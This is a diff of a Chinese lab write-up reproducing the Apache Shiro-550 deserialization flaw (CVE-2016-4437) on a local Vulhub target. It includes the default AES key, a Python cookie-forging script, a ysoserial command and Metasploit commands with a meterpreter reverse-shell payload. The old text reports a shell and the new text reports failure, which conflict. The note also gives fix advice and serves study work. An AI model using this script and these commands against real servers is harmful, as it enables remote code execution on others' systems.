@@ -1,56 +1,54 @@
-# CVE-2016-4437 Shiro-550 复现笔记
+# CVE‑2016‑4437 Shiro‑550 复现笔记
 > 本地 Vulhub | 2026.08.25
----
+
 ## 漏洞说明
-Shiro 1.2.4 及之前版本，`rememberMe` 用了固定 AES 密钥：
+Shiro 1.2.4 及之前版本，`rememberMe` 使用了固定 AES 密钥：
+
 ```
 kPH+bIxk5D2deZiIxcaaaA==
 ```
+攻击者拿到密钥即可构造恶意 Cookie，服务端接收后触发反序列化，执行系统命令。漏洞核心成因：**密钥硬编码 + 反序列化漏洞**。
 
-知道密钥就能自己拼 Cookie 发过去，服务端反序列化后执行命令。就两个关键点：密钥硬编码 + 反序列化。
----
 ## 环境
 | 项目 | 内容 |
 |------|------|
 | 攻击机 | Kali Linux |
 | 靶场 | Vulhub shiro 1.2.4 |
-| 靶机 | http://192.168.1.81:8080 |
-| 工具 | Burp Suite、ysoserial、Python、msf |
----
+| 靶机地址 | http://192.168.1.81:8080 |
+| 工具 | Burp Suite、ysoserial、Python、Metasploit |
+
 ## 手动复现过程
-### 1. ![启动docker环境](./images/1-docker-up.png)
+### 1. 启动 docker 环境
+[图片]
+
 
 ```
 cd vulhub-master/shiro/CVE-2016-4437
 docker-compose up -d
 ```
 
-### 2. 验证漏洞
+### 2. 验证漏洞特征
 
-浏览器访问登录页，抓响应包，看到 `Set-Cookie: rememberMe=deleteMe`，说明 rememberMe 功能是开着的。
+访问靶场登录页面，抓包查看响应头，返回 `Set‑Cookie: rememberMe=deleteMe`，代表 `rememberMe` 功能开启，存在漏洞测试条件。
 
-[https://./screenshots/2-login-page.png](https://./screenshots/2-login-page.png)
+[图片]
 
 ### 3. 生成恶意 Cookie
 
-Shiro Cookie 生成逻辑：
+Shiro Cookie 生成流程：
 
-1. 序列化 payload
-    
-2. AES-CBC 加密（密钥固定）
-    
-3. IV 拼在最前面（16 字节全零）
-    
-4. 整体 Base64
-    
+1. 使用 ysoserial 生成反序列化 payload
+2. AES‑CBC 加密（使用漏洞默认密钥，IV 填充 16 字节`\x00`）
+3. IV 拼接密文后进行 Base64 编码
 
-加密脚本如下：
+Python 加密脚本：
 
-python
-
+```Python
 import base64
 from Crypto.Cipher import AES
+
 KEY = base64.b64decode("kPH+bIxk5D2deZiIxcaaaA==")
+
 def make_shiro_cookie(data):
     iv = b'\x00' * 16
     cipher = AES.new(KEY, AES.MODE_CBC, iv)
@@ -58,45 +56,51 @@ def make_shiro_cookie(data):
     data += bytes([pad_len]) * pad_len
     encrypted = cipher.encrypt(data)
     return base64.b64encode(iv + encrypted).decode()
+```
 
-生成 payload：
+生成 payload 命令：
 
 ```
 java -jar ysoserial-all.jar CommonsCollections2 "id" > payload.ser
 ```
 
-执行脚本后得到 Base64。
+运行加密脚本，得到 rememberMe 的 Base64 字符串。
 
-<img width="1280" height="763" alt="4-burp-send" src="https://github.com/user-attachments/assets/a4ee97dd-095b-406c-b25b-e6aa1bf0a37c" />
+[图片]
 
+[图片]
 
-### 4. Burp 发送
+### 4. Burp Suite 发送恶意 Cookie
 
-抓个请求，Cookie 改成 `rememberMe=刚才那串Base64`，发出去。
+修改请求包 Cookie 字段：`rememberMe=生成的Base64字符串`，发送请求进行测试。
 
+## 复现问题：持续返回 302 跳转
 
-## 卡住了
+[图片]
 
-返回 302，`rememberMe` 被清掉：
+服务器响应：
 
+```
 Set-Cookie: rememberMe=deleteMe
 Location: /login
+```
 
-说明反序列化失败了。换了几个链都这样：
+更换多条反序列化链测试均出现相同结果：
 
-|链|结果|
+表格
+
+|反序列化链|返回结果|
 |---|---|
-|CommonsCollections1|302|
-|CommonsCollections2|302|
-|CommonsBeanutils1|302|
-|Jdk7u21|302|
+|CommonsCollections1|302 跳转，Cookie 清空|
+|CommonsCollections2|302 跳转，Cookie 清空|
+|CommonsBeanutils1|302 跳转，Cookie 清空|
+|Jdk7u21|302 跳转，Cookie 清空|
 
-应该是靶机缺对应的依赖库，类加载失败被 Shiro catch 住了。手动折腾了挺久没打通。
+> 现象说明：`rememberMe=deleteMe` 代表 Shiro 捕获到反序列化异常，直接丢弃 Cookie。大概率是靶场环境缺少对应依赖包，当前选用的 Gadget 链无法执行。
 
-## 改用 msf 收尾
+## Metasploit 尝试（未获取 Shell）
 
-手动一直卡在 302，换 msf 试了一下：
-
+```
 msfconsole
 use exploit/multi/http/shiro_rememberme_v122
 set RHOSTS 192.168.1.81
@@ -104,27 +108,20 @@ set RPORT 8080
 set PAYLOAD linux/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.81
 run
+```
 
-跑通，拿到 shell。
+运行后攻击失败，未能成功获取 Meterpreter 会话。 [图片]
 
+## 复盘总结
 
-虽然手动没成，但至少确认漏洞是真实存在的，只是链没选对或者环境缺东西。
+1. 已成功识别 Shiro‑550 漏洞特征，环境搭建完整；
+2. 熟悉 remember‑me Cookie 完整加密流程：IV 填充‑AES 加密‑Base64 编码；
+3. 反序列化链不是万能，能否执行高度依赖靶机已安装的 Jar 依赖；
+4. `302跳转 + rememberMe=deleteMe` 是 Shiro 反序列化报错最典型标志；
+5. 后续优化方向：更换适配该靶场版本的 Gadget 链、尝试 Shiro 扫描工具检测可用密钥与链。
 
 ## 修复建议
 
-- 升级 Shiro 到 1.2.5 以上，官方已经把硬编码密钥去掉了
-    
-- 如果没法升级，换掉默认密钥，自己生成随机值
-    
-- 用不上 `rememberMe` 就关了
-    
-
-## 记录几点
-
-- Shiro Cookie 加密流程清楚了（密钥、IV、Base64 那块）
-    
-- 反序列化链不是通用的，依赖目标环境
-    
-- 302 + deleteMe 基本就是反序列化报错了
-    
-- 手动搞不定就换工具，别死磕
+- 升级 Apache‑Shiro 版本至 1.2.5 及以上，移除默认硬编码密钥；
+- 无法升级版本时，自定义生成随机 AES 密钥，禁止使用官方默认密钥；
+- 业务不需要记住登录功能，关闭 remember‑me 选项。
